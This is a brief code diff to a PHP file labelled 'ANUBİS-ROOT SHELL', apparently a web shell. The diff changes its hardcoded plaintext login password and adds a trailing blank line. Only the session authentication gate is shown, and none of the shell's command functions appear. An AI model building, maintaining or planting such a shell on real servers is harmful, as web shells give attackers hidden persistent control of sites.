@@ -5,7 +5,7 @@ date_default_timezone_set('UTC');
 
 // ANUBİS-ROOT SHELL - Authentication Required
 session_start();
-$auth_password = 'anus3162'; // Şifre buraya
+$auth_password = 'anubis3162'; // Şifre buraya
 
 if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
     if (isset($_POST['password']) && $_POST['password'] === $auth_password) {
@@ -2052,4 +2052,5 @@ document.getElementById("slideUpBtn").onclick = function() {
 </script>
 
 </body>
+
 </html>
